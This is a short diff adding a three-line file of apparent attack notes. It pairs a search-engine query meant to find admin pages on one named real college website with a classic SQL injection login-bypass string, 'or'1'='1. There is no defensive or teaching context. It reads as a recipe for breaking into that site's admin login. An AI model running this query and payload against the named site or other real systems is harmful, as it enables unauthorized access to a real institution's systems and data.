@@ -1,0 +1,3 @@
+inurl::admin site "www.gndec.ac.in"
+
+sql ingection:   'or'1'='1
